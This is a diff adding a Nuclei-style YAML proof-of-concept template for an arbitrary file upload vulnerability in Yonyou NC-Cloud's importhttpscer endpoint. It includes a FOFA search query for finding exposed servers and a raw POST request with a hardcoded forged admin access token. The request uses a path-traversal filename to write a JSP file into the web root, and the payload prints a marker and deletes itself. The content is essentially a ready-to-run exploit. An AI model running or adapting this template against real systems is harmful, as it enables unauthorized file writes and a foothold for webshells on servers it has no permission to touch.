@@ -1,0 +1,65 @@
+id: poc-md1o2iwkp23w0gcn
+info:
+  name: 用友NC-Cloud importhttpscer 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/md1o2iwkp23w0gcn'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: md1o2iwkp23w0gcn
+    fofa: body="/Client/Uclient/UClient.exe"||body="ufida.ico"||body="nccloud"||body="/api/uclient/public/"
+http:
+- raw:
+  - 'POST /nccloud/mob/pfxx/manualload/importhttpscer HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    accessToken: eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA
+
+
+    Content-Type: multipart/form-data; boundary=fdgbufgiugfbifureh7rgigvgbg998
+
+
+
+
+    --fdgbufgiugfbifureh7rgigvgbg998
+
+
+    Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/dudesuite.jsp"
+
+
+
+
+    <% out.println("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+
+
+    --fdgbufgiugfbifureh7rgigvgbg998--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /dudesuite.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
